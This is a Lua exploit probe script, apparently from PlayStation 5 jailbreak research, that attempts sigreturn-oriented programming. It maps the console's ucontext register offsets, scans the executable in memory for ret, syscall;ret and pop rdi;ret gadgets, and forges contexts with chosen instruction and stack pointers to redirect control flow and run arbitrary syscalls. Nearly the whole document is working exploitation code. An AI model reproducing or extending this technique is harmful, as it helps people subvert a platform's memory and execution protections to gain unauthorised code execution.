-- CRASH_CLASS: HIGH
-- PROBE 128b: SROP WITH CORRECT OFFSETS — THE REAL TEST
--
-- Context: 128a PROVED:
--   1. getcontext(421) works, rv=0
--   2. sigreturn(417) returns rv=0 (accepts the context!)
--   3. The PS5 ucontext has mcontext at +0x40, NOT +0x10
--   4. 128a modified WRONG offsets (mc_r10/mc_r13 instead of mc_rip/mc_rsp)
--      which is why sigreturn returned to normal execution
--
-- CORRECT PS5 ucontext_t layout (from getcontext data):
--   mcontext starts at ctx+0x40
--   mc_rdi    = ctx+0x48    mc_rsi    = ctx+0x50
--   mc_rdx    = ctx+0x58    mc_rcx    = ctx+0x60
--   mc_r8     = ctx+0x68    mc_r9     = ctx+0x70
--   mc_rax    = ctx+0x78    mc_rbx    = ctx+0x80
--   mc_rbp    = ctx+0x88    mc_r10    = ctx+0x90
--   mc_r11    = ctx+0x98    mc_r12    = ctx+0xA0
--   mc_r13    = ctx+0xA8    mc_r14    = ctx+0xB0
--   mc_r15    = ctx+0xB8
--   mc_trapno = ctx+0xC0    mc_fs/gs  = ctx+0xC4/0xC6
--   mc_addr   = ctx+0xC8    mc_flags  = ctx+0xD0
--   mc_err    = ctx+0xD8
--   mc_rip    = ctx+0xE0    ← THE REAL RIP OFFSET
--   mc_cs     = ctx+0xE8    (should be 0x43)
--   mc_rflags = ctx+0xF0    (should be 0x202)
--   mc_rsp    = ctx+0xF8    ← THE REAL RSP OFFSET
--   mc_ss     = ctx+0x100   (should be 0x3B)
--   mc_len    = ctx+0x108   (0x480)
--
-- Strategy:
--   A: getcontext → modify mc_rip(+0xE0) to ret gadget → sigreturn
--      If AFTER_SROP is MISSING: sigreturn redirected to our gadget!
--   B: getcontext → set RAX=20(getpid), RIP=syscall gadget → sigreturn
--      If we get a pid back: ARBITRARY SYSCALL EXECUTION

print("=== PROBE 128b: SROP CORRECT OFFSETS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc624 = make_syscall(624)

local pid = to_num(sc20())
print("[0] pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot=" .. hex(eboot_base))

-- CORRECT offsets (PS5 ucontext, mcontext at +0x40)
local MC = 0x40  -- mcontext offset in ucontext
local RDI = MC + 0x08    -- 0x48
local RSI = MC + 0x10    -- 0x50
local RDX = MC + 0x18    -- 0x58
local RCX = MC + 0x20    -- 0x60
local R8  = MC + 0x28    -- 0x68
local R9  = MC + 0x30    -- 0x70
local RAX = MC + 0x38    -- 0x78
local RBX = MC + 0x40    -- 0x80
local RBP = MC + 0x48    -- 0x88
local R10 = MC + 0x50    -- 0x90
local R11 = MC + 0x58    -- 0x98
local R12 = MC + 0x60    -- 0xA0
local R13 = MC + 0x68    -- 0xA8
local R14 = MC + 0x70    -- 0xB0
local R15 = MC + 0x78    -- 0xB8
local RIP = MC + 0xA0    -- 0xE0  ← THE KEY OFFSET
local CS  = MC + 0xA8    -- 0xE8
local RFLAGS = MC + 0xB0 -- 0xF0
local RSP = MC + 0xB8    -- 0xF8
local SS  = MC + 0xC0    -- 0x100
local LEN = MC + 0xC8    -- 0x108

print("[0] RIP offset=0x" .. string.format("%X", RIP)
    .. " CS=0x" .. string.format("%X", CS)
    .. " RSP=0x" .. string.format("%X", RSP))

-- Find gadgets in eboot
-- 0xC3 = ret
local ret_gadget = eboot_base + 0x42  -- known from 56g
print("[0] ret_gadget=" .. hex(ret_gadget))

-- Search for syscall;ret (0x0F 0x05 0xC3) in eboot
print("[0] Searching for syscall;ret gadget in eboot...")
local syscall_ret = nil
for off = 0, 0x200000, 1 do
    local b1 = nil
    local ok1, v1 = pcall(function() return memory.read_byte(eboot_base + off) end)
    if ok1 then b1 = to_num(v1) end
    if b1 == 0x0F then
        local ok2, v2 = pcall(function() return memory.read_byte(eboot_base + off + 1) end)
        local ok3, v3 = pcall(function() return memory.read_byte(eboot_base + off + 2) end)
        if ok2 and ok3 and to_num(v2) == 0x05 and to_num(v3) == 0xC3 then
            syscall_ret = eboot_base + off
            print("[0] FOUND syscall;ret at eboot+0x" .. string.format("%X", off)
                .. " = " .. hex(syscall_ret))
            break
        end
    end
    -- Don't scan forever
    if off > 0x50000 then break end
end

-- Also look for pop rdi; ret (0x5F 0xC3)
local pop_rdi_ret = nil
for off = 0, 0x50000, 1 do
    local ok1, v1 = pcall(function() return memory.read_byte(eboot_base + off) end)
    local ok2, v2 = pcall(function() return memory.read_byte(eboot_base + off + 1) end)
    if ok1 and ok2 and to_num(v1) == 0x5F and to_num(v2) == 0xC3 then
        pop_rdi_ret = eboot_base + off
        print("[0] FOUND pop rdi;ret at eboot+0x" .. string.format("%X", off))
        break
    end
end

-- Allocate GPU mmap for SROP stack
local ok_mm, srop_stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x8000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] srop_stack=" .. hex(srop_stack))

--------------------------------------------------------------------
-- SECTION A: getcontext → modify RIP at CORRECT offset → sigreturn
--------------------------------------------------------------------
print("")
print("--- SECTION A: SROP with correct RIP offset ---")

local CTX_SIZE = 0x500
local ctx = memory.alloc(CTX_SIZE)
zero(ctx, CTX_SIZE)

local ok_gc, rv_gc = pcall(function()
    return sc_getcontext(uint64(ctx))
end)
print("[A] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. hex(rv_gc))

if not ok_gc or to_num(rv_gc) ~= 0 then
    print("STOP: getcontext failed")
    return
end

-- Verify the captured context
local cap_rip = rq(ctx + RIP)
local cap_cs = rq(ctx + CS)
local cap_rsp = rq(ctx + RSP)
local cap_ss = rq(ctx + SS)
print("[A] captured: RIP=" .. hex(cap_rip) .. " CS=" .. hex(cap_cs)
    .. " RSP=" .. hex(cap_rsp) .. " SS=" .. hex(cap_ss))

-- Copy context
local ctx_a = memory.alloc(CTX_SIZE)
for off = 0, CTX_SIZE - 4, 4 do
    wd(ctx_a + off, rd(ctx + off) or 0)
end

-- Write a marker on our GPU stack
local srop_top = srop_stack + 0x7E00
wq(srop_top, uint64(0xDEAD0001DEAD0001))
wq(srop_top + 8, uint64(0xDEAD0002DEAD0002))

-- Modify ONLY mc_rip to point to ret gadget
-- Modify ONLY mc_rsp to point to our GPU stack
wq(ctx_a + RIP, ret_gadget)
wq(ctx_a + RSP, srop_top)

print("[A] modified: RIP=" .. hex(rq(ctx_a + RIP))
    .. " RSP=" .. hex(rq(ctx_a + RSP)))
print("[A] CS=" .. hex(rq(ctx_a + CS)) .. " SS=" .. hex(rq(ctx_a + SS))
    .. " RFLAGS=" .. hex(rq(ctx_a + RFLAGS)))

-- Write return address at [srop_top] for the ret gadget
-- ret will pop this and jump to it
-- Write another ret gadget → creates a ret sled
wq(srop_top, ret_gadget)        -- ret → pops this → jumps to ret_gadget again
wq(srop_top + 8, ret_gadget)    -- second ret
wq(srop_top + 16, uint64(0))   -- third entry: 0 → fault (ends the sled)

print("")
print("[A] === FIRING SIGRETURN WITH CORRECT OFFSETS ===")
print("[BEFORE_SROP_A]")

-- Save canary BEFORE sigreturn
local pre_624 = to_num(sc624())

local ok_sr, rv_sr = pcall(function()
    return sc_sigreturn(uint64(ctx_a))
end)

-- If AFTER_SROP_A prints: sigreturn did NOT redirect (or redirected and came back)
-- If AFTER_SROP_A is MISSING: sigreturn redirected to ret gadget → faulted
print("[AFTER_SROP_A]")
print("[A] sigreturn: ok=" .. tostring(ok_sr) .. " rv=" .. hex(rv_sr))

-- Check canary
local post_624 = to_num(sc624())
print("[A] 624 counter: pre=" .. pre_624 .. " post=" .. post_624)

-- Check if our GPU stack was modified (ret gadget read from it)
local s0 = rq(srop_top)
local s1 = rq(srop_top + 8)
local s2 = rq(srop_top + 16)
print("[A] stack: [0]=" .. hex(s0) .. " [8]=" .. hex(s1) .. " [16]=" .. hex(s2))

-- Check pid
print("[A] canary pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: If sigreturn works + syscall;ret found → ARBITRARY SYSCALL
--------------------------------------------------------------------
if syscall_ret then
    print("")
    print("--- SECTION B: SROP → getpid via syscall;ret gadget ---")

    -- Fresh getcontext
    local ctx_b = memory.alloc(CTX_SIZE)
    zero(ctx_b, CTX_SIZE)
    local ok_gc2, rv_gc2 = pcall(function()
        return sc_getcontext(uint64(ctx_b))
    end)
    print("[B] getcontext: ok=" .. tostring(ok_gc2) .. " rv=" .. hex(rv_gc2))

    if ok_gc2 and to_num(rv_gc2) == 0 then
        -- Set up: RAX=20 (getpid), RIP=syscall;ret
        -- After syscall;ret: RIP = value popped from stack
        -- Put another ret gadget at [RSP] so we return cleanly

        local b_top = srop_stack + 0x6000
        -- After syscall;ret returns, the ret pops from [RSP+8]
        -- Actually syscall doesn't push; ret pops from current RSP
        -- So: syscall executes getpid → ret pops [b_top] → jumps there
        wq(b_top, ret_gadget)      -- after syscall;ret, ret pops this
        wq(b_top + 8, uint64(0))  -- next ret → fault

        wq(ctx_b + RIP, syscall_ret)
        wq(ctx_b + RSP, b_top)
        wq(ctx_b + RAX, uint64(20))  -- syscall number for getpid

        print("[B] RIP=" .. hex(rq(ctx_b + RIP)) .. " (syscall;ret)")
        print("[B] RAX=20 (getpid)")
        print("[B] RSP=" .. hex(rq(ctx_b + RSP)))

        print("[BEFORE_SROP_B]")
        local ok_b, rv_b = pcall(function()
            return sc_sigreturn(uint64(ctx_b))
        end)
        print("[AFTER_SROP_B]")
        print("[B] sigreturn: ok=" .. tostring(ok_b) .. " rv=" .. hex(rv_b))
        print("[B] canary pid=" .. to_num(sc20()))
    end
end

print("")
print("[FINAL] canary=" .. to_num(sc20()))
print("=== PROBE 128b COMPLETE ===")
